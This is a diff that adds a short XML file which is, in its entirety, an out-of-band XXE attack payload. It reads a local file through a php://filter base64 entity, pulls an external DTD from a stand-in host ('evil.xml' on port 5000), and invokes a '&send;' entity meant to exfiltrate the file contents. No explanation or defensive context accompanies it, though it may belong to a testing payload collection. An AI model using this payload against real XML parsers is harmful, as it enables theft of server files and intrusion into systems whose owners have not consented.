@@ -1,0 +1,6 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE roottag [
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=file:///path/to/file"> <!ENTITY % dtd SYSTEM "http://0.0.0.0:5000/evil.xml">
+%dtd;
+]>
+<roottag>&send;</roottag>
